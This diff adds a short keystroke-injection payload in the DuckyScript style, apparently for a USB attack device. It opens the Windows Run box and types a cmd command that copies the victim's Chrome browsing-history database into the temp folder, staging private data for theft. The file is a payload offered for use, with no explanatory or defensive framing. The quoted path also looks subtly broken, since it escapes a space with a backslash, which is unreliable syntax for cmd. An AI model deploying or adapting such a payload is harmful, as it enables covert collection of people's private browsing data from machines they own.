@@ -1,0 +1,10 @@
+REM Browser History
+
+GUI r
+
+DELAY 500
+
+STRING cmd /c copy %APPDATA%\..\Local\Google\Chrome\User\ Data\Default\History %temp%\
+
+ENTER
+
